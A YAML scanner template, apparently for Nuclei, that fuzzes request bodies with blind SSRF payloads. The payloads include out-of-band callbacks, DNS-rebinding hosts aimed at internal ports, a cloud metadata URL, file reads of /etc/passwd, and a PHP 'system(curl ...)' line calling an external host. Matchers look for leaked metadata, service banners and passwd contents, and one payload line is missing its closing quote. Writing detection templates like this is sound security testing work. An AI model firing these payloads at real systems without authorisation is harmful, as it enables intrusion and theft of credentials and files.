id: blind-ssrf-body

info:
  name: Blind SSRF OAST Detection
  author: 4rt3f4kt
  severity: medium
  tags: fuzzing-req-body,fuzzing-req

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "POST"'
          - 'method == "PUT"'
          - 'method == "PATCH"'
          - 'method == "DELETE"'

    payloads:
      ssrf:
        - "{{interactsh-url}}"
        - "{{FQDN}}.{{interactsh-url}}"
        - "{{RDN}}.{{interactsh-url}}"
        - "{{FQDN}}@{{interactsh-url}}"
        - "{{RDN}}@{{interactsh-url}}"
        - "*@{{interactsh-url}}"
        - "../../../https://{{interactsh-url}}"
        - "/.//{{interactsh-url}}/"
        - "//{{interactsh-url}}"
        - "7f000001.7f000001.rbndr.us:22"
        - "7f000001.7f000001.rbndr.us:3306"
        - "7f000001.7f000001.rbndr.us:6379"
        - "<?php system('curl http://{{interactsh-url}}');?>"
        - "@http://{{interactsh-url}}"
        - "@{{interactsh-url}}"
        - "\\@{{interactsh-url}}"
        - "\nhttp://{{interactsh-url}}"
        - "\r\nhttp://{{interactsh-url}}"
        - "\rhttp://{{interactsh-url}}"
        - "app-169-254-169-254.nip.io/latest/meta-data/"
        - "customer2-app-127-0-0-1.nip.io:22"
        - "data:image/png;base64,{{base64('https://{{interactsh-url}}')}}"
        - "dict://127.0.0.1:6379/info"
        - "dict://{{interactsh-url}}"
        - "file:////./etc/./passwd"
        - "file:///c:/./windows/./win.ini"
        - "ftp://{{interactsh-url}}"
        - "gopher://{{interactsh-url}}"
        - "http%253A%252F%252F{{interactsh-url}}%252Fshell.php"
        - "http%3A%2F%2F{{interactsh-url}}%2Fshell.php"
        - "magic.127.0.0.1.nip.io:22"
        - "redis://{{interactsh-url}}"
        - "sftp://{{interactsh-url}}"
        - "tftp://{{interactsh-url}}"
        - "url:http://{{interactsh-url}}"
        - "{{Host}}#%20@{{interactsh-url}}"
        - "{{Host}}#@{{interactsh-url}}"
        - "{{Host}}%25253F@{{interactsh-url}}"
        - "{{Host}}%253F@{{interactsh-url}}"
        - "{{Host}}%5C@{{interactsh-url}}"
        - "{{Host}}@{{interactsh-url}}"
        - "{{base64('@{{interactsh-url}}')}}"
        - "{{base64('http://{{interactsh-url}}')}}"
        - "{{base64('https://{{interactsh-url}}')}}"
        - "{{base64('{{Host}}@{{interactsh-url}}')}}"
        - "{{base64('{{Host}}\\@{{interactsh-url}}')}}"
        - "{{base64('{{interactsh-url}}')}}"
        - "{{interactsh-url}}


    fuzzing:
      - part: body
        mode: single
        type: replace
        fuzz:
          - "{{ssrf}}"
          
    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or
          
      - type: word
        part: body
        words:
          - "ami-id"
          - "hostname"
          - "security-groups"
        condition: and
        
      - type: word
        part: body
        words:
          - "droplet"
          - "hostname"
          - "region"
        condition: and
        
      - type: regex
        part: body
        regex:
          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
          
      - type: regex
        part: body
        regex:
          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
          
      - type: regex
        part: body
        regex:
          - '(\d.\d.\d)(.*?)mysql_native_password'
          
      - type: regex
        part: body
        regex:
          - 'root:.*?:[0-9]*:[0-9]*:'
          
      - type: word
        part: body
        words:
          - 'for 16-bit app support'
          
      - type: regex
        part: body
        regex:
          - 'dns-conf/(.*?)instance/'
          
      - type: regex
        part: body
        regex:
          - 'app-id(.*?)placement/'
          
      - type: regex
        part: body
        regex:
          - 'ami-id(.*?)placement/'
          
      - type: regex
        part: body
        regex:
          - 'id(.*?)interfaces/'